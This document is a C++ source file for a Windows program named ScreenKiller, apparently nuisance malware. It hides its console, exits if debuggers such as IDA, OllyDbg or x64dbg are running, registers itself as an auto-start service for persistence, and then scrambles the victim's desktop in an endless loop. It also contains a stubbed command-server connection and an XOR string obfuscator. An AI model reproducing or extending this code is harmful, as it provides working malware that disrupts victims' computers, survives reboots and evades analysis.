#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <thread>

#include "ScreenKiller.hpp"

VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj);

ScreenKiller::ScreenKiller() : m_alive(false), m_persistent(false), m_connected(false) {}

ScreenKiller::~ScreenKiller()
{
	this->suicide();
}

void ScreenKiller::deploy()
{
	this->m_alive = true;

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	this->runner_thread = std::thread([this] {this->deploy_inner(); });
}

void ScreenKiller::suicide()
{
	this->runner_thread.detach();
	this->m_alive = false;
}

std::string ScreenKiller::encrypt_string(std::string input_string)
{
	std::string output_string = "";

	for (char const& c : input_string) {
		output_string += (char)(c ^ XOR_KEY);
	}

	return output_string;
}

bool ScreenKiller::deploy_inner()
{
	this->connect_to_master_server();
	this->exit_if_debugged();
	this->get_persistency();

	HWND hDesktop = NULL;
	ScreenProps screen_props = { 0 };
	hDesktop = GetDesktopWindow();

	screen_props.hdcScreen = GetDCEx(hDesktop, NULL, DCX_CACHE | DCX_LOCKWINDOWUPDATE);

	srand(GetCurrentTime());

	RECT desktop = { 0 };
	
	GetWindowRect(hDesktop, &(screen_props.rectScreen));

	while (this->m_alive)
	{
		ScrambleWindow(&screen_props, this);
		Sleep(10);
	}

	return true;
}

bool ScreenKiller::get_persistency()
{
	TCHAR computer_name[MAX_COMPUTER_NAME];
	DWORD computer_name_length = MAX_COMPUTER_NAME;
	TCHAR szExeFilename[MAX_PATH];

	if (GetModuleFileName(NULL, szExeFilename, MAX_PATH) == 0)
		return false;

	if (!GetComputerName(computer_name, &computer_name_length))
		return false;

	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	schSCManager = OpenSCManager(computer_name, NULL, SC_MANAGER_ALL_ACCESS);
	if (!schSCManager)
		return false;

	CreateService(schSCManager,
		SERVICE_NAME,
		SERVICE_NAME,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		szExeFilename,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL) != NULL;

	return true;
}

bool ScreenKiller::connect_to_master_server()
{
	return false;
}

void ScreenKiller::exit_if_debugged()
{
	if (this->is_debugged1() || this->is_debugged2())
		exit(1337);
}

bool ScreenKiller::is_debugged1()
{
	return IsDebuggerPresent();
}

bool ScreenKiller::is_debugged2()
{
		const wchar_t* debuggersFilename[6] = {
			L"cheatengine-x86_64.exe",
			L"ollydbg.exe",
			L"ida.exe",
			L"ida64.exe",
			L"radare2.exe",
			L"x64dbg.exe"
		};

		wchar_t* processName;
		PROCESSENTRY32W processInformation{ sizeof(PROCESSENTRY32W) };
		HANDLE processList;
		
		processList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		processInformation = { sizeof(PROCESSENTRY32W) };
		if (!(Process32FirstW(processList, &processInformation)))
			return false;
		else
		{
			do
			{
				for (const wchar_t* debugger : debuggersFilename)
				{
					processName = processInformation.szExeFile;
					if (_wcsicmp(debugger, processName) == 0) {
						return true;
					}
				}
			} while (Process32NextW(processList, &processInformation));
		}
		CloseHandle(processList);

		return false;
}

VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj) 
{
	HDC hdcScreen = screen_props->hdcScreen;
	RECT rectScreen = screen_props->rectScreen;
	HDC hdcMemory = NULL;
	HBITMAP hBitmap = NULL;
	int iWidth, iHeight, iX1, iY1, iX2, iY2;

	hdcMemory = CreateCompatibleDC(hdcScreen);

	iWidth = abs(rectScreen.left - rectScreen.right) / DIVIDERS;
	iHeight = abs(rectScreen.top - rectScreen.bottom) / DIVIDERS;

	SelectObject(hdcMemory, hBitmap);

	while (TRUE)
	{
		obj->exit_if_debugged();

		iX1 = rectScreen.left + iWidth * (rand() % DIVIDERS);
		iX2 = rectScreen.left + iWidth * (rand() % DIVIDERS);
		iY1 = rectScreen.top + iHeight * (rand() % DIVIDERS);
		iY2 = rectScreen.top + iHeight * (rand() % DIVIDERS);

		BitBlt(hdcMemory, 0, 0, iWidth, iHeight, hdcScreen, iX1, iY1, SRCCOPY);
		BitBlt(hdcScreen, iX1, iY1, iWidth, iHeight, hdcScreen, iX2, iY2, SRCCOPY);
		BitBlt(hdcScreen, iX2, iY2, iWidth, iHeight, hdcMemory, 0, 0, SRCCOPY);

		Sleep(10);
	}

	DeleteDC(hdcMemory);
	DeleteObject(hBitmap);
	free(screen_props);
}
